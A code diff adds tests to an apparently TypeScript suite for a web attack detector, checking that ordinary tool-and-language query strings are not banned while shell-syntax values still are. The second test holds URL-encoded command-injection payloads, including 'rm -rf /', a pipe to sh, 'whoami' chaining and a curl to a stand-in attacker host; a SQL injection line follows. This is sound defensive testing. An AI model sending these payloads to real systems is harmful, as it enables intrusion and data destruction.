@@ -91,6 +91,40 @@ describe('web attack detection (OWASP CRS, PL1)', () => {
     }
   });
 
+  it('does not ban ordinary fleet pages whose query names a tool or a language', () => {
+    // From the 2026-10-18 nichedb /traffic review: 8,521 banned addresses had
+    // only ever loaded pages like these. Tag and filter values are words.
+    const failures: string[] = [];
+    for (const path of [
+      '/c/mcp?tag=docker-compose',
+      '/c/packages?tag=docker-build',
+      '/providers?has=cli&runtime=perl%2Cnode&category=dedicated',
+      '/providers?has=mcp&runtime=perl%2Cnode&category=vanity-hosting%2Cvps',
+      '/candidates?tags=REST%2CPerl%2CGo%2CSvelte%2FSvelteKit%2CCopilot%2CCursor',
+      '/candidates?tags=Docker%2CGo%2CJavaScript%2CPHP%2CClaude%20Code',
+      '/feeds/new?collection=books&tags=prevention+%26+control',
+      '/c/workflows?tag=gabe4coding',
+      '/servers?country=NL%2CCL&page=10',
+    ]) {
+      const assessment = assessNginxRequest(line(`GET ${path} HTTP/2.0`));
+      if (attackSeverity(assessment))
+        failures.push(`${path}: ${assessment.matches.map((m) => m.id).join(',')} score ${assessment.score}`);
+    }
+    expect(failures).toEqual([]);
+  });
+
+  it('still bans command injection once a value carries shell syntax', () => {
+    for (const path of [
+      '/x?q=docker%3B%20rm%20-rf%20/',
+      '/x?q=perl%20-e%20%27print%201%27%20%7C%20sh',
+      '/x?host=127.0.0.1%26%26whoami',
+      '/x?cmd=%24(curl%20http://evil.example/x)',
+    ]) {
+      const assessment = assessNginxRequest(line(`GET ${path} HTTP/2.0`));
+      expect(attackSeverity(assessment), `${path}: score ${assessment.score}`).not.toBeNull();
+    }
+  });
+
   it('puts classic attacks at or over the threshold', () => {
     const cases: Array<[string, string]> = [
       ['GET /search?q=1%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1', 'sqli'],
